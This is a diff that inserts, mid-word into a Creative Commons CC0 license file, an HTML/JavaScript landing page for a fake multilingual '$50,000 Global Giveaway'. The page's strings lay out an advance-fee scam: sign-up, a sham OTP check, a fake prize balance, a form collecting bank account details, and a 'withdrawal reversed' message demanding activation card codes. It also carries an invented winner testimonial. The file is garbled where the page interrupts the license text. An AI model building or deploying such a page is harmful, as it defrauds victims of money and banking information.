@@ -1,4 +1,145 @@
-Creative Commons Legal Code
+Creati<!DOCTYPE html>
+<html lang="es" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sorteo Global 2025 - ¡Gana $50,000!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { font-family: 'Inter', sans-serif; background-color: #0A192F; color: #CCD6F6; }
+        .glass-effect { background-color: rgba(16, 33, 58, 0.8); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border: 1px solid rgba(45, 212, 191, 0.1); }
+        @keyframes pulse { 50% { transform: scale(1.03); box-shadow: 0 0 20px rgba(45, 212, 191, 0.4); } }
+        @keyframes float { 50% { transform: translateY(-10px); } }
+        @keyframes shake { 10%, 90% { transform: translateX(-5px); } 20%, 80% { transform: translateX(5px); } 30%, 50%, 70% { transform: translateX(-5px); } 40%, 60% { transform: translateX(5px); } }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .cta-button-main { animation: pulse 2.5s infinite ease-in-out; transition: transform 0.3s ease; }
+        .cta-button-main:hover { transform: translateY(-3px); }
+        .floating-icon { animation: float 3s infinite ease-in-out; }
+        .interactive-card:hover { transform: translateY(-8px); border-color: #2DD4BF; box-shadow: 0 10px 30px -15px rgba(45, 212, 191, 0.2); }
+        .hidden { display: none; }
+        .shake-error { animation: shake 0.5s ease-in-out; }
+        .loader { border-top-color: #2DD4BF; animation: spin 1s linear infinite; }
+        .section-fade-in { opacity: 0; transform: translateY(20px); transition: opacity 0.6s ease-out, transform 0.6s ease-out; }
+        .section-fade-in.visible { opacity: 1; transform: translateY(0); }
+    </style>
+</head>
+<body class="overflow-x-hidden">
+
+    <header class="glass-effect fixed top-0 left-0 right-0 z-50">
+        <div class="container mx-auto px-6 py-3 flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 flex items-center justify-center bg-gradient-to-br from-teal-400 to-cyan-500 rounded-lg shadow-lg">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7" /></svg>
+                </div>
+                <span class="text-xl font-bold text-white" data-translate="giveawayName">Sorteo Global</span>
+            </div>
+            <div class="flex items-center gap-4">
+                <select id="languageSelector" class="glass-effect text-white rounded-md p-2 border border-slate-700 focus:outline-none focus:ring-2 focus:ring-teal-500">
+                    <option value="es">Español</option>
+                    <option value="en">English</option>
+                    <option value="pt">Português</option>
+                    <option value="la">Latīna</option>
+                    <option value="it">Italiano</option>
+                    <option value="de">Deutsch</option>
+                </select>
+                <button class="enter-giveaway-btn bg-teal-500 hover:bg-teal-400 text-white font-bold py-2 px-6 rounded-lg shadow-lg transition-transform hover:scale-105" data-translate="enterNow">Entrar Ahora</button>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <section class="pt-32 pb-20 text-center">
+            <div class="container mx-auto px-6">
+                <div class="w-24 h-24 mx-auto mb-6 flex items-center justify-center bg-gradient-to-br from-teal-400 to-cyan-500 rounded-2xl shadow-2xl shadow-teal-500/20 floating-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-14 w-14 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v.01M12 6v-1m0 1H9.5a2.5 2.5 0 00-2.5 2.5V10M12 6h2.5a2.5 2.5 0 012.5 2.5V10m0 0h-5m5 0v1m0 1v.01m0 1v.01m0 1v.01m0 1v.01M12 12v2m0 4h.01m4.938-4.938a2.25 2.25 0 013.181 0l1.415 1.415a2.25 2.25 0 010 3.181l-1.415 1.415a2.25 2.25 0 01-3.181 0l-1.415-1.415a2.25 2.25 0 010-3.181zM12 12c-2.485 0-4.5 2.015-4.5 4.5s2.015 4.5 4.5 4.5 4.5-2.015 4.5-4.5S14.485 12 12 12z" /></svg>
+                </div>
+                <h1 class="text-4xl md:text-6xl font-extrabold text-white mb-4 leading-tight" data-translate="mainHeadline">Tu Oportunidad de Ganar el <span class="bg-clip-text text-transparent bg-gradient-to-r from-teal-300 to-cyan-400">$50,000 Gran Premio</span></h1>
+                <p class="text-lg md:text-xl text-slate-400 max-w-3xl mx-auto mb-8" data-translate="subHeadline">¡El Sorteo Global 2025 está oficialmente abierto! Crea tu cuenta gratis hoy para tener la oportunidad de cambiar tu vida. La participación es 100% gratuita.</p>
+                <button class="cta-button-main enter-giveaway-btn inline-block bg-gradient-to-r from-teal-500 to-cyan-500 text-white font-bold text-lg py-4 px-10 rounded-lg" data-translate="enterNowCTA">Entra al Sorteo Ahora</button>
+            </div>
+        </section>
+        
+        <section class="section-fade-in py-20">
+            <div class="container mx-auto px-6">
+                <div class="text-center mb-12">
+                    <h2 class="text-3xl md:text-4xl font-bold text-white" data-translate="stepsHeadline">Consigue tu Participación en 3 Simples Pasos</h2>
+                    <p class="text-slate-400 mt-2" data-translate="stepsSubheadline">El proceso es rápido, gratuito y seguro.</p>
+                </div>
+                <div class="grid md:grid-cols-3 gap-8 text-center">
+                    <div class="interactive-card bg-slate-800/50 p-8 rounded-xl border border-slate-700 transition-all">
+                        <div class="text-4xl mb-4 text-teal-300 font-black floating-icon" style="animation-delay: 0.1s;">1.</div>
+                        <h3 class="text-2xl font-bold text-white" data-translate="step1Title">Regístrate</h3>
+                        <p class="text-slate-400" data-translate="step1Desc">Crea tu cuenta gratuita usando tu correo. Solo toma un minuto.</p>
+                    </div>
+                    <div class="interactive-card bg-slate-800/50 p-8 rounded-xl border border-slate-700 transition-all">
+                        <div class="text-4xl mb-4 text-teal-300 font-black floating-icon" style="animation-delay: 0.2s;">2.</div>
+                        <h3 class="text-2xl font-bold text-white" data-translate="step2Title">Verifica</h3>
+                        <p class="text-slate-400" data-translate="step2Desc">Completa el simple paso de verificación para asegurar y validar tu entrada.</p>
+                    </div>
+                    <div class="interactive-card bg-slate-800/50 p-8 rounded-xl border border-slate-700 transition-all">
+                        <div class="text-4xl mb-4 text-teal-300 font-black floating-icon" style="animation-delay: 0.3s;">3.</div>
+                        <h3 class="text-2xl font-bold text-white" data-translate="step3Title">Gana</h3>
+                        <p class="text-slate-400" data-translate="step3Desc">¡Eso es todo! Estás en el sorteo. El ganador será anunciado después de la fecha límite.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+        
+        <section class="section-fade-in py-20 text-center">
+            <div class="container mx-auto px-6">
+                <h2 class="text-3xl md:text-4xl font-bold text-white" data-translate="countdownHeadline">¡El Tiempo se Acaba!</h2>
+                <p class="text-slate-400 mt-2 mb-8" data-translate="countdownSubheadline">El sorteo cierra pronto para nuevas inscripciones. No pierdas tu oportunidad.</p>
+                <div id="countdown" class="grid grid-cols-2 md:grid-cols-4 gap-4 max-w-2xl mx-auto text-white">
+                    <div class="glass-effect p-6 rounded-lg"><div id="days" class="text-4xl md:text-5xl font-bold">00</div><div class="text-sm text-slate-400" data-translate="days">Días</div></div>
+                    <div class="glass-effect p-6 rounded-lg"><div id="hours" class="text-4xl md:text-5xl font-bold">00</div><div class="text-sm text-slate-400" data-translate="hours">Horas</div></div>
+                    <div class="glass-effect p-6 rounded-lg"><div id="minutes" class="text-4xl md:text-5xl font-bold">00</div><div class="text-sm text-slate-400" data-translate="minutes">Minutos</div></div>
+                    <div class="glass-effect p-6 rounded-lg"><div id="seconds" class="text-4xl md:text-5xl font-bold">00</div><div class="text-sm text-slate-400" data-translate="seconds">Segundos</div></div>
+                </div>
+            </div>
+        </section>
+        
+        <section class="section-fade-in py-20">
+            <div class="container mx-auto px-6 text-center">
+                <img src="https://placehold.co/100x100/2DD4BF/0A192F?text=A.L." alt="Foto de testimonio" class="w-24 h-24 rounded-full mx-auto mb-6 border-4 border-slate-700">
+                <blockquote class="max-w-3xl mx-auto">
+                    <p class="text-xl md:text-2xl text-white font-medium mb-4" data-translate="testimonialQuote">"¡No podía creerlo al principio! Este sorteo es real y cambió mi vida. ¡Tienes que participar para poder ganar! Realmente una bendición."</p>
+                    <footer class="text-slate-400 font-bold" data-translate="testimonialAuthor">Adebayo L. de Lagos, Nigeria</footer>
+                    <p class="text-teal-300 text-sm mt-1" data-translate="testimonialRole">Ganador del Gran Premio Anterior</p>
+                </blockquote>
+            </div>
+        </section>
+    </main>
+    
+    <footer class="bg-slate-900 border-t border-slate-800"><div class="container mx-auto px-6 py-8 text-center text-slate-500"><p>&copy; 2025 Sorteo Global. Todos los Derechos Reservados.</p><div class="mt-4 space-x-6"><a href="#" class="hover:text-teal-300" data-translate="terms">Términos de Servicio</a><a href="#" class="hover:text-teal-300" data-translate="privacy">Política de Privacidad</a></div></div></footer>
+    
+    <div id="appModal" class="fixed inset-0 bg-black/70 flex items-center justify-center p-4 z-[100] hidden"><button id="closeModalBtn" class="absolute top-4 right-4 text-white/70 hover:text-white transition-colors z-[110]"><svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" /></svg></button><div id="appContainer" class="glass-effect relative w-full max-w-md p-8 rounded-2xl shadow-xl text-gray-800"></div></div>
+    <div id="loader" class="fixed inset-0 bg-slate-900 bg-opacity-75 flex flex-col items-center justify-center hidden z-[120]"><div class="loader rounded-full border-8 border-t-8 border-gray-200 h-20 w-20"></div><p id="loaderText" class="text-white mt-4" data-translate="processing">Procesando...</p></div>
+    <div id="notificationModal" class="fixed inset-0 bg-slate-900 bg-opacity-75 flex items-center justify-center hidden z-[120] p-4"><div class="bg-white p-8 rounded-lg shadow-xl max-w-sm w-full text-center"><h3 id="notificationTitle" class="text-xl font-bold mb-4"></h3><p id="notificationMessage" class="text-gray-600 mb-6"></p><div id="notificationButtons" class="flex justify-center gap-4"></div></div></div>
+
+    <script>
+        // --- SCRIPT FOR DEPLOYMENT ---
+        const serverUrl = 'YOUR_RENDER_SERVER_URL_HERE';
+
+        // --- DOM Elements ---
+        const appModal = document.getElementById('appModal'), closeModalBtn = document.getElementById('closeModalBtn'), enterGiveawayBtns = document.querySelectorAll('.enter-giveaway-btn'), appContainer = document.getElementById('appContainer'), loader = document.getElementById('loader'), notificationModal = document.getElementById('notificationModal'), languageSelector = document.getElementById('languageSelector');
+
+        // --- App State ---
+        let state = { username: "", balance: 50000, transactions: [], currentScreen: "register", language: "es" };
+        let generatedOtp, dateTimeInterval;
+
+        // --- Translations Object ---
+        const translations = {
+            es: {
+                giveawayName: "Sorteo Global", enterNow: "Entrar Ahora", mainHeadline: 'Tu Oportunidad de Ganar el <span class="bg-clip-text text-transparent bg-gradient-to-r from-teal-300 to-cyan-400">$50,000 Gran Premio</span>', subHeadline: "¡El Sorteo Global 2025 está oficialmente abierto! Crea tu cuenta gratis hoy para tener la oportunidad de cambiar tu vida. La participación es 100% gratuita.", enterNowCTA: "Entra al Sorteo Ahora", stepsHeadline: "Consigue tu Participación en 3 Simples Pasos", stepsSubheadline: "El proceso es rápido, gratuito y seguro.", step1Title: "Regístrate", step1Desc: "Crea tu cuenta gratuita usando tu correo. Solo toma un minuto.", step2Title: "Verifica", step2Desc: "Completa el simple paso de verificación para asegurar y validar tu entrada.", step3Title: "Gana", step3Desc: "¡Eso es todo! Estás en el sorteo. El ganador será anunciado después de la fecha límite.", countdownHeadline: "¡El Tiempo se Acaba!", countdownSubheadline: "El sorteo cierra pronto para nuevas inscripciones. No pierdas tu oportunidad.", days: "Días", hours: "Horas", minutes: "Minutos", seconds: "Segundos", testimonialQuote: '"¡No podía creerlo al principio! Este sorteo es real y cambió mi vida. ¡Tienes que participar para poder ganar! Realmente una bendición."', testimonialAuthor: "Adebayo L. de Lagos, Nigeria", testimonialRole: "Ganador del Gran Premio Anterior", terms: "Términos de Servicio", privacy: "Política de Privacidad", processing: "Procesando...",
+                createAccount: "Crea Tu Cuenta", usernameLabel: "Nombre de usuario", emailLabel: "Correo electrónico", passwordLabel: "Contraseña", registerBtn: "Registrarse", helpCenter: "Centro de Ayuda", otpTitle: "Verificación OTP", otpMessage: "Se ha enviado una notificación a ganadoresafortunados@gmail.com. Por favor, introduce el código para continuar.", otpCode: "Código OTP", otpPlaceholder: "Ingresa tu código OTP de 6 dígitos", verifyBtn: "Verificar", welcome: "¡Bienvenido(a)", yourBalance: "Tu Saldo del Sorteo", withdrawFunds: "Retirar Fondos", transactionHistory: "Historial de Transacciones", withdrawTitle: "Retirar Fondos", accountNumber: "Número de Cuenta", accountName: "Nombre del Titular de la Cuenta", bankName: "Nombre del Banco", amountToWithdraw: "Monto a Retirar", preferredCurrency: "Moneda Preferida", pesos: "Pesos", euros: "Euros", dollars: "Dólares", submitWithdrawal: "Enviar Retiro", backToDashboard: "Volver al Panel", addCardTitle: "Añadir Tarjeta de Activación", cardType: "Tipo de Tarjeta", cardAmount: "Monto de la Tarjeta", cardCode: "Código de la Tarjeta", loadCard: "Cargar Tarjeta", historyTitle: "Historial de Transacciones", noTransactions: "No hay transacciones todavía.", missingCardTitle: "Tarjeta de Activación Requerida", missingCardMessage: "Su retiro ha sido revertido. Se requiere una tarjeta de activación para procesar los retiros. Por favor, añada una para continuar.", cancel: "Cancelar", addCard: "Añadir Tarjeta", cardSuccessTitle: "¡Tarjeta Añadida!", cardSuccessMessage: "Su tarjeta de activación ha sido añadida exitosamente. Ahora puede intentar su retiro de nuevo.", ok: "OK",
+            },
+            en: {
+                giveawayName: "Global Giveaway", enterNow: "Enter Now", mainHeadline: 'Your Chance to Win the <span class="bg-clip-text text-transparent bg-gradient-to-r from-teal-300 to-cyan-400">$50,000 Grand Prize</span>', subHeadline: "The 2025 Global Giveaway is officially open! Create your free account today for a chance to change your life. Participation is 100% free.", enterNowCTA: "Enter the Giveaway Now", stepsHeadline: "Get Your Entry in 3 Simple Steps", stepsSubheadline: "The process is fast, free, and secure.", step1Title: "Register", step1Desc: "Create your free account using your email. It only takes a minute.", step2Title: "Verify", step2Desc: "Complete the simple verification step to secure and validate your entry.", step3Title: "Win", step3Desc: "That's it! You're in the draw. The winner will be announced after the deadline.", countdownHeadline: "Time is Running Out!", countdownSubheadline: "The giveaway closes for new entries soon. Don't miss your chance.", days: "Days", hours: "Hours", minutes: "Minutes", seconds: "Seconds", testimonialQuote: '"I couldn\'t believe it at first! This giveaway is real and it changed my life. You have to be in it to win it! Truly a blessing."', testimonialAuthor: "Adebayo L. from Lagos, Nigeria", testimonialRole: "Previous Grand Prize Winner", terms: "Terms of Service", privacy: "Privacy Policy", processing: "Processing...",
+                createAccount: "Create Your Account", usernameLabel: "Username", emailLabel: "Email", passwordLabel: "Password", registerBtn: "Register", helpCenter: "Help Center", otpTitle: "OTP Verification", otpMessage: "A notification has been sent to ganadoresafortunados@gmail.com. Please enter the code to continue.", otpCode: "OTP Code", otpPlaceholder: "Enter your 6-digit OTP code", verifyBtn: "Verify", welcome: "Welcome", yourBalance: "Your Giveaway Balance", withdrawFunds: "Withdraw Funds", transactionHistory: "Transaction History", withdrawTitle: "Withdraw Funds", accountNumber: "Account Number", accountName: "Account Holder Name", bankName: "Bank Name", amountToWithdraw: "Amount to Withdraw", preferredCurrency: "Preferred Currency", pesos: "Pesos", euros: "Euros", dollars: "Dollars", submitWithdrawal: "Submit Withdrawal", backToDashboard: "Back to Dashboard", addCardTitle: "Add Activation Card", cardType: "Card Type", cardAmount: "Card Amount", cardCode: "Card Code", loadCard: "Load Card", historyTitle: "Transaction History", noTransactions: "No transactions yet.", missingCardTitle: "Activation Card Required", missingCardMessage: "Your withdrawal has been reversed. An activation card is required to process withdrawals. Please add one to continue.", cancel: "Cancel", addCard: "Add Card", cardSuccessTitle: "Card Added!", cardSuccessMessage: "Your activation card has been successfully added. You can now try your withdrawal again.", ok: "OK",
+            },
+            pt: {
+                giveawayName: "Sorteio Global", enterNow: "Entrar Agora", mainHeadline: 'Sua Chance de Ganhar o <span class="bg-clip-text text-transparent bg-gradient-to-r from-teal-300 to-cyan-400">Grande Prêmio de $50,000</span>', subHeadline: "O Sorteio Global de 2025 está oficialmente aberto! Crie sua conta gratuita hoje para ter a chance de mudar sua vida. A participação é 100% gratuita.", enterNowCTA: "Entre no Sorteio Agora", stepsHeadline: "Obtenha sua Entrada em 3 Passos Simples", stepsSubheadline: "O processo é rápido, gratuito e seguro.", step1Title: "Registre-se", step1Desc: "Crie sua conta gratuita usando seu e-mail. Leva apenas um minuto.", step2Title: "Verifique", step2Desc: "Complete o passo de verificação simples para garantir e validar sua entrada.", step3Title: "Ganhe", step3Desc: "É isso! Você está no sorteio. O vencedor será anunciado após o prazo.", countdownHeadline: "O Tempo está Acabando!", countdownSubheadline: "O sorteio para novas inscrições fecha em breve. Não perca sua chance.", days: "Dias", hours: "Horas", minutes: "Minutos", seconds: "Segundos", testimonialQuote: '"Eu não podia acreditar no início! Este sorteio é real e mudou minha vida. Você tem que participar para ganhar! Verdadeiramente uma bênção."', testimonialAuthor: "Adebayo L. de Lagos, Nigéria", testimonialRole: "Vencedor Anteriorve Commons Legal Code
 
 CC0 1.0 Universal
 
